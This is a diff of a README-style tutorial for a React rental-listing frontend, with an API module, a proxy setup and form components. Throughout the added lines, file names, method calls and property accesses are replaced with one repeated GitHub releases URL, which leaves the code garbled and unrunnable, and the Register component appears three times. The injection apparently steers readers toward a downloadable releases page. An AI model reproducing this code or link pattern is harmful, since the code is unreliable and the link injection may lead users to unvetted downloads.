@@ -12,57 +12,57 @@ rentify-frontend/
 ├── src/
 │   ├── components/
 │   │   ├── Auth/
-│   │   │   ├── Login.js
-│   │   │   └── Register.js
+│   │   │   ├── https://github.com/swati1504-bot/Rentify/releases
+│   │   │   └── https://github.com/swati1504-bot/Rentify/releases
 │   │   ├── Layout/
-│   │   │   ├── Header.js
-│   │   │   └── Footer.js
+│   │   │   ├── https://github.com/swati1504-bot/Rentify/releases
+│   │   │   └── https://github.com/swati1504-bot/Rentify/releases
 │   │   ├── Properties/
-│   │   │   ├── PropertyList.js
-│   │   │   ├── PropertyDetails.js
-│   │   │   ├── AddProperty.js
-│   │   │   └── EditProperty.js
-│   │   ├── Dashboard.js
-│   │   ├── Home.js
-│   │   └── Profile.js
+│   │   │   ├── https://github.com/swati1504-bot/Rentify/releases
+│   │   │   ├── https://github.com/swati1504-bot/Rentify/releases
+│   │   │   ├── https://github.com/swati1504-bot/Rentify/releases
+│   │   │   └── https://github.com/swati1504-bot/Rentify/releases
+│   │   ├── https://github.com/swati1504-bot/Rentify/releases
+│   │   ├── https://github.com/swati1504-bot/Rentify/releases
+│   │   └── https://github.com/swati1504-bot/Rentify/releases
 │   ├── api/
-│   │   └── api.js
-│   ├── App.css
-│   ├── App.js
-│   ├── index.js
-│   └── setupProxy.js
+│   │   └── https://github.com/swati1504-bot/Rentify/releases
+│   ├── https://github.com/swati1504-bot/Rentify/releases
+│   ├── https://github.com/swati1504-bot/Rentify/releases
+│   ├── https://github.com/swati1504-bot/Rentify/releases
+│   └── https://github.com/swati1504-bot/Rentify/releases
 ├── .env
-└── package.json
+└── https://github.com/swati1504-bot/Rentify/releases
 # Environment Variables:
 REACT_APP_API_URL=http://rentifysever:5000/api
 
 # API Setup
 import axios from 'axios';
 
-const API = axios.create({ baseURL: process.env.REACT_APP_API_URL });
+const API = https://github.com/swati1504-bot/Rentify/releases({ baseURL: https://github.com/swati1504-bot/Rentify/releases });
 
-API.interceptors.request.use((req) => {
-    if (localStorage.getItem('token')) {
-        req.headers.Authorization = `Bearer ${localStorage.getItem('token')}`;
+https://github.com/swati1504-bot/Rentify/releases((req) => {
+    if (https://github.com/swati1504-bot/Rentify/releases('token')) {
+        https://github.com/swati1504-bot/Rentify/releases = `Bearer ${https://github.com/swati1504-bot/Rentify/releases('token')}`;
     }
     return req;
 });
 
-export const register = (formData) => API.post('/users/register', formData);
-export const login = (formData) => API.post('/users/login', formData);
-export const getProfile = () => API.get('/users/profile');
+export const register = (formData) => https://github.com/swati1504-bot/Rentify/releases('/users/register', formData);
+export const login = (formData) => https://github.com/swati1504-bot/Rentify/releases('/users/login', formData);
+export const getProfile = () => https://github.com/swati1504-bot/Rentify/releases('/users/profile');
 
-export const createProperty = (formData) => API.post('/properties', formData);
-export const getProperties = () => API.get('/properties');
-export const getProperty = (id) => API.get(`/properties/${id}`);
-export const updateProperty = (id, formData) => API.put(`/properties/${id}`, formData);
-export const deleteProperty = (id) => API.delete(`/properties/${id}`);
-export const likeProperty = (id) => API.post(`/properties/${id}/like`);
+export const createProperty = (formData) => https://github.com/swati1504-bot/Rentify/releases('/properties', formData);
+export const getProperties = () => https://github.com/swati1504-bot/Rentify/releases('/properties');
+export const getProperty = (id) => https://github.com/swati1504-bot/Rentify/releases(`/properties/${id}`);
+export const updateProperty = (id, formData) => https://github.com/swati1504-bot/Rentify/releases(`/properties/${id}`, formData);
+export const deleteProperty = (id) => https://github.com/swati1504-bot/Rentify/releases(`/properties/${id}`);
+export const likeProperty = (id) => https://github.com/swati1504-bot/Rentify/releases(`/properties/${id}/like`);
 # Setup Proxy:
 const { createProxyMiddleware } = require('http-proxy-middleware');
 
-module.exports = function (app) {
-    app.use(
+https://github.com/swati1504-bot/Rentify/releases = function (app) {
+    https://github.com/swati1504-bot/Rentify/releases(
         '/api',
         createProxyMiddleware({
             target: 'http://localhost:5000',
@@ -164,13 +164,13 @@ function Login() {
     const history = useHistory();
 
     const handleSubmit = async (e) => {
-        e.preventDefault();
+        https://github.com/swati1504-bot/Rentify/releases();
         try {
                             const { data } = await login({ email, password });
-                localStorage.setItem('token', data.token);
-                history.push('/dashboard');
+                https://github.com/swati1504-bot/Rentify/releases('token', https://github.com/swati1504-bot/Rentify/releases);
+                https://github.com/swati1504-bot/Rentify/releases('/dashboard');
             } catch (error) {
-                console.error(error.message);
+                https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
             }
         };
 
@@ -183,7 +183,7 @@ function Login() {
                         <input
                             type="email"
                             value={email}
-                            onChange={(e) => setEmail(e.target.value)}
+                            onChange={(e) => setEmail(https://github.com/swati1504-bot/Rentify/releases)}
                             required
                         />
                     </div>
@@ -192,7 +192,7 @@ function Login() {
                         <input
                             type="password"
                             value={password}
-                            onChange={(e) => setPassword(e.target.value)}
+                            onChange={(e) => setPassword(https://github.com/swati1504-bot/Rentify/releases)}
                             required
                         />
                     </div>
@@ -217,13 +217,13 @@ function Register() {
     const history = useHistory();
 
     const handleSubmit = async (e) => {
-        e.preventDefault();
+        https://github.com/swati1504-bot/Rentify/releases();
         try {
             const { data } = await register({ firstName, lastName, email, phone, password });
-            localStorage.setItem('token', data.token);
-            history.push('/dashboard');
+            https://github.com/swati1504-bot/Rentify/releases('token', https://github.com/swati1504-bot/Rentify/releases);
+            https://github.com/swati1504-bot/Rentify/releases('/dashboard');
         } catch (error) {
-            console.error(error.message);
+            https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
         }
     };
 
@@ -236,7 +236,7 @@ function Register() {
                     <input
                         type="text"
                         value={firstName}
-                        onChange={(e) => setFirstName(e.target.value)}
+                        onChange={(e) => setFirstName(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -245,7 +245,7 @@ function Register() {
                     <input
                         type="text"
                         value={lastName}
-                        onChange={(e) => setLastName(e.target.value)}
+                        onChange={(e) => setLastName(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -254,7 +254,7 @@ function Register() {
                     <input
                         type="email"
                         value={email}
-                        onChange={(e) => setEmail(e.target.value)}
+                        onChange={(e) => setEmail(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -263,7 +263,7 @@ function Register() {
                     <input
                         type="text"
                         value={phone}
-                        onChange={(e) => setPhone(e.target.value)}
+                        onChange={(e) => setPhone(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -272,7 +272,7 @@ function Register() {
                     <input
                         type="password"
                         value={password}
-                        onChange={(e) => setPassword(e.target.value)}
+                        onChange={(e) => setPassword(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -296,13 +296,13 @@ function Register() {
     const history = useHistory();
 
     const handleSubmit = async (e) => {
-        e.preventDefault();
+        https://github.com/swati1504-bot/Rentify/releases();
         try {
             const { data } = await register({ firstName, lastName, email, phone, password });
-            localStorage.setItem('token', data.token);
-            history.push('/dashboard');
+            https://github.com/swati1504-bot/Rentify/releases('token', https://github.com/swati1504-bot/Rentify/releases);
+            https://github.com/swati1504-bot/Rentify/releases('/dashboard');
         } catch (error) {
-            console.error(error.message);
+            https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
         }
     };
 
@@ -315,7 +315,7 @@ function Register() {
                     <input
                         type="text"
                         value={firstName}
-                        onChange={(e) => setFirstName(e.target.value)}
+                        onChange={(e) => setFirstName(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -324,7 +324,7 @@ function Register() {
                     <input
                         type="text"
                         value={lastName}
-                        onChange={(e) => setLastName(e.target.value)}
+                        onChange={(e) => setLastName(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -333,7 +333,7 @@ function Register() {
                     <input
                         type="email"
                         value={email}
-                        onChange={(e) => setEmail(e.target.value)}
+                        onChange={(e) => setEmail(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -342,7 +342,7 @@ function Register() {
                     <input
                         type="text"
                         value={phone}
-                        onChange={(e) => setPhone(e.target.value)}
+                        onChange={(e) => setPhone(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -351,7 +351,7 @@ function Register() {
                     <input
                         type="password"
                         value={password}
-                        onChange={(e) => setPassword(e.target.value)}
+                        onChange={(e) => setPassword(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -375,13 +375,13 @@ function Register() {
     const history = useHistory();
 
     const handleSubmit = async (e) => {
-        e.preventDefault();
+        https://github.com/swati1504-bot/Rentify/releases();
         try {
             const { data } = await register({ firstName, lastName, email, phone, password });
-            localStorage.setItem('token', data.token);
-            history.push('/dashboard');
+            https://github.com/swati1504-bot/Rentify/releases('token', https://github.com/swati1504-bot/Rentify/releases);
+            https://github.com/swati1504-bot/Rentify/releases('/dashboard');
         } catch (error) {
-            console.error(error.message);
+            https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
         }
     };
 
@@ -394,7 +394,7 @@ function Register() {
                     <input
                         type="text"
                         value={firstName}
-                        onChange={(e) => setFirstName(e.target.value)}
+                        onChange={(e) => setFirstName(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -403,7 +403,7 @@ function Register() {
                     <input
                         type="text"
                         value={lastName}
-                        onChange={(e) => setLastName(e.target.value)}
+                        onChange={(e) => setLastName(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -412,7 +412,7 @@ function Register() {
                     <input
                         type="email"
                         value={email}
-                        onChange={(e) => setEmail(e.target.value)}
+                        onChange={(e) => setEmail(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -421,7 +421,7 @@ function Register() {
                     <input
                         type="text"
                         value={phone}
-                        onChange={(e) => setPhone(e.target.value)}
+                        onChange={(e) => setPhone(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -430,7 +430,7 @@ function Register() {
                     <input
                         type="password"
                         value={password}
-                        onChange={(e) => setPassword(e.target.value)}
+                        onChange={(e) => setPassword(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -444,7 +444,7 @@ export default Register;
 
 **Dashboard Component:**
 
-    Create `src/components/Dashboard.js`:
+    Create `https://github.com/swati1504-bot/Rentify/releases`:
 
     ```js
     import React, { useEffect, useState } from 'react';
@@ -459,7 +459,7 @@ export default Register;
                     const { data } = await getProfile();
                     setUser(data);
                 } catch (error) {
-                    console.error(error.message);
+                    https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
                 }
             };
 
@@ -471,9 +471,9 @@ export default Register;
                 <h2>Dashboard</h2>
                 {user && (
                     <div>
-                        <p>Welcome, {user.firstName} {user.lastName}</p>
-                        <p>Email: {user.email}</p>
-                        <p>Phone: {user.phone}</p>
+                        <p>Welcome, {https://github.com/swati1504-bot/Rentify/releases} {https://github.com/swati1504-bot/Rentify/releases}</p>
+                        <p>Email: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                        <p>Phone: {https://github.com/swati1504-bot/Rentify/releases}</p>
                     </div>
                 )}
             </div>
@@ -494,7 +494,7 @@ function Profile() {
                 const { data } = await getProfile();
                 setUser(data);
             } catch (error) {
-                console.error(error.message);
+                https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
             }
         };
 
@@ -506,10 +506,10 @@ function Profile() {
             <h2>Profile</h2>
             {user && (
                 <div>
-                    <p>First Name: {user.firstName}</p>
-                    <p>Last Name: {user.lastName}</p>
-                    <p>Email: {user.email}</p>
-                    <p>Phone: {user.phone}</p>
+                    <p>First Name: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                    <p>Last Name: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                    <p>Email: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                    <p>Phone: {https://github.com/swati1504-bot/Rentify/releases}</p>
                 </div>
             )}
         </div>
@@ -520,7 +520,7 @@ export default Profile;
 
 **Property List Component:**
 
-    Create `src/components/Properties/PropertyList.js`:
+    Create `https://github.com/swati1504-bot/Rentify/releases`:
 
     ```js
     import React, { useEffect, useState } from 'react';
@@ -536,7 +536,7 @@ export default Profile;
                     const { data } = await getProperties();
                     setProperties(data);
                 } catch (error) {
-                    console.error(error.message);
+                    https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
                 }
             };
 
@@ -547,10 +547,10 @@ export default Profile;
             <div>
                 <h2>Properties</h2>
                 <ul>
-                    {properties.map((property) => (
+                    {https://github.com/swati1504-bot/Rentify/releases((property) => (
                         <li key={property._id}>
                             <Link to={`/properties/${property._id}`}>
-                                {property.place} - {property.area}
+                                {https://github.com/swati1504-bot/Rentify/releases} - {https://github.com/swati1504-bot/Rentify/releases}
                             </Link>
                         </li>
                     ))}
@@ -575,7 +575,7 @@ function PropertyDetails() {
                 const { data } = await getProperty(id);
                 setProperty(data);
             } catch (error) {
-                console.error(error.message);
+                https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
             }
         };
 
@@ -587,7 +587,7 @@ function PropertyDetails() {
             const { data } = await likeProperty(id);
             setProperty(data);
         } catch (error) {
-            console.error(error.message);
+            https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
         }
     };
 
@@ -595,13 +595,13 @@ function PropertyDetails() {
         <div>
             {property && (
                 <div>
-                    <h2>{property.place}</h2>
-                    <p>Area: {property.area}</p>
-                    <p>Bedrooms: {property.bedrooms}</p>
-                    <p>Bathrooms: {property.bathrooms}</p>
-                    <p>Nearby Hospitals: {property.nearbyHospitals}</p>
-                    <p>Nearby Colleges: {property.nearbyColleges}</p>
-                    <p>Likes: {property.likes}</p>
+                    <h2>{https://github.com/swati1504-bot/Rentify/releases}</h2>
+                    <p>Area: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                    <p>Bedrooms: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                    <p>Bathrooms: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                    <p>Nearby Hospitals: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                    <p>Nearby Colleges: {https://github.com/swati1504-bot/Rentify/releases}</p>
+                    <p>Likes: {https://github.com/swati1504-bot/Rentify/releases}</p>
                     <button onClick={handleLike}>Like</button>
                 </div>
             )}
@@ -630,7 +630,7 @@ export default PropertyDetails;
         const history = useHistory();
 
         const handleSubmit = async (e) => {
-            e.preventDefault();
+            https://github.com/swati1504-bot/Rentify/releases();
             try {
                 await createProperty({
                     place,
@@ -640,9 +640,9 @@ export default PropertyDetails;
                     nearbyHospitals,
                     nearbyColleges,
                 });
-                history.push('/properties');
+                https://github.com/swati1504-bot/Rentify/releases('/properties');
             } catch (error) {
-                console.error(error.message);
+                https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
             }
         };
 
@@ -655,7 +655,7 @@ export default PropertyDetails;
                         <input
                             type="text"
                             value={place}
-                            onChange={(e) => setPlace(e.target.value)}
+                            onChange={(e) => setPlace(https://github.com/swati1504-bot/Rentify/releases)}
                             required
                         />
                     </div>
@@ -664,7 +664,7 @@ export default PropertyDetails;
                         <input
                             type="text"
                             value={area}
-                            onChange={(e) => setArea(e.target.value)}
+                            onChange={(e) => setArea(https://github.com/swati1504-bot/Rentify/releases)}
                             required
                         />
                     </div>
@@ -673,7 +673,7 @@ export default PropertyDetails;
                         <input
                             type="number"
                             value={bedrooms}
-                            onChange={(e) => setBedrooms(e.target.value)}
+                            onChange={(e) => setBedrooms(https://github.com/swati1504-bot/Rentify/releases)}
                             required
                         />
                     </div>
@@ -682,7 +682,7 @@ export default PropertyDetails;
                         <input
                             type="number"
                             value={bathrooms}
-                            onChange={(e) => setBathrooms(e.target.value)}
+                            onChange={(e) => setBathrooms(https://github.com/swati1504-bot/Rentify/releases)}
                             required
                         />
                     </div>
@@ -691,7 +691,7 @@ export default PropertyDetails;
                         <input
                             type="text"
                             value={nearbyHospitals}
-                            onChange={(e) => setNearbyHospitals(e.target.value)}
+                            onChange={(e) => setNearbyHospitals(https://github.com/swati1504-bot/Rentify/releases)}
                             required
                         />
                     </div>
@@ -700,7 +700,7 @@ export default PropertyDetails;
                         <input
                             type="text"
                             value={nearbyColleges}
-                            onChange={(e) => setNearbyColleges(e.target.value)}
+                            onChange={(e) => setNearbyColleges(https://github.com/swati1504-bot/Rentify/releases)}
                             required
                         />
                     </div>
@@ -730,14 +730,14 @@ function EditProperty() {
         const fetchProperty = async () => {
             try {
                 const { data } = await getProperty(id);
-                setPlace(data.place);
-                setArea(data.area);
-                setBedrooms(data.bedrooms);
-                setBathrooms(data.bathrooms);
-                setNearbyHospitals(data.nearbyHospitals);
-                setNearbyColleges(data.nearbyColleges);
+                setPlace(https://github.com/swati1504-bot/Rentify/releases);
+                setArea(https://github.com/swati1504-bot/Rentify/releases);
+                setBedrooms(https://github.com/swati1504-bot/Rentify/releases);
+                setBathrooms(https://github.com/swati1504-bot/Rentify/releases);
+                setNearbyHospitals(https://github.com/swati1504-bot/Rentify/releases);
+                setNearbyColleges(https://github.com/swati1504-bot/Rentify/releases);
             } catch (error) {
-                console.error(error.message);
+                https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
             }
         };
 
@@ -745,7 +745,7 @@ function EditProperty() {
     }, [id]);
 
     const handleSubmit = async (e) => {
-        e.preventDefault();
+        https://github.com/swati1504-bot/Rentify/releases();
         try {
             await updateProperty(id, {
                 place,
@@ -755,9 +755,9 @@ function EditProperty() {
                 nearbyHospitals,
                 nearbyColleges,
             });
-            history.push(`/properties/${id}`);
+            https://github.com/swati1504-bot/Rentify/releases(`/properties/${id}`);
         } catch (error) {
-            console.error(error.message);
+            https://github.com/swati1504-bot/Rentify/releases(https://github.com/swati1504-bot/Rentify/releases);
         }
     };
 
@@ -770,7 +770,7 @@ function EditProperty() {
                     <input
                         type="text"
                         value={place}
-                        onChange={(e) => setPlace(e.target.value)}
+                        onChange={(e) => setPlace(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -779,7 +779,7 @@ function EditProperty() {
                     <input
                         type="text"
                         value={area}
-                        onChange={(e) => setArea(e.target.value)}
+                        onChange={(e) => setArea(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -788,7 +788,7 @@ function EditProperty() {
                     <input
                         type="number"
                         value={bedrooms}
-                        onChange={(e) => setBedrooms(e.target.value)}
+                        onChange={(e) => setBedrooms(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -797,7 +797,7 @@ function EditProperty() {
                     <input
                         type="number"
                         value={bathrooms}
-                        onChange={(e) => setBathrooms(e.target.value)}
+                        onChange={(e) => setBathrooms(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -806,7 +806,7 @@ function EditProperty() {
                     <input
                         type="text"
                         value={nearbyHospitals}
-                        onChange={(e) => setNearbyHospitals(e.target.value)}
+                        onChange={(e) => setNearbyHospitals(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
@@ -815,7 +815,7 @@ function EditProperty() {
                     <input
                         type="text"
                         value={nearbyColleges}
-                        onChange={(e) => setNearbyColleges(e.target.value)}
+                        onChange={(e) => setNearbyColleges(https://github.com/swati1504-bot/Rentify/releases)}
                         required
                     />
                 </div>
